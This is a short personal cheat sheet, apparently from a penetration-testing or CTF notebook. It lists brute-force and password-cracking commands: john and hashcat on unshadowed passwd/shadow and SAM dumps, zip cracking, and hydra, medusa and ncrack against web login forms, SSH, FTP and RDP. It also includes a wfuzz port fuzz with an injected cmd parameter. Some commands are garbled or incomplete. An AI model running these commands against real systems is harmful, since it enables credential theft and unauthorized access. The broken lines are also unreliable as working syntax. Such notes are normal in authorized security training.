---
tags: 🔻 🔻/🃏 Passwords bruteforce hashcat john wfuzz hydra
aliases: Hacking Notes
---

# Quick Brute Force Commands

# ruteforce

#unshadow  
unshadow passwd shadow > creds.txt  
  
#john   
john --wordlist=rockyou.txt creds.txt  
  
  
#fcrackzip  
fcrackzip -u -D -p ‘rockyou.txt’ zip\_file  
  
  
zip2john zip\_file > hash.txt  

john --format=zip hash.txt  

#hydra 

hydra -l username -P password\_list IP\_ADDR -V http-post-form ‘/path/login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’ -t 25  


#hashcat 
hashcat -a 0 -m hash-mode hash.txt rockyou.txt  
  
python true.py bhaskara > hashes  
john hashes --show  
  
pwdump system sam  
  
unshadow passwd shadow > passwords  
john --wordlist=/usr/share/wordlists/rockyou.txt passwords  
  
#WFUZZ   
wfuzz -c --hl=4 -z range,1-65535 -H ​"Cookie: password=secret" [http://socket?port=FUZZ&cmd=test%27%C2%A0]



# ssh
#ssh 
SSH user with password list  
`hydra -l user -P pass.txt -t` x.x.x.x  
  
hydra -l usere -P list.txt ssh://ip -t 4 -I  
  
hydra -L user.txt -P dict.txt ip ssh -s 65345 -e nsr

# rdp
#rdp 

RDP user with password list  
`ncrack -vv --user offsec -P passwords rdp://`x.x.x.x

# ftp
#FTP 

FTP user with password list  
`medusa -h` x.x.x.x  
  
hydra -l matt -P /usr/share/wordlists/rockyou.txt x.x.x.x

# ncrack
#ncrack

ncrack -vv --user admin -P password-file.txt rdp://ip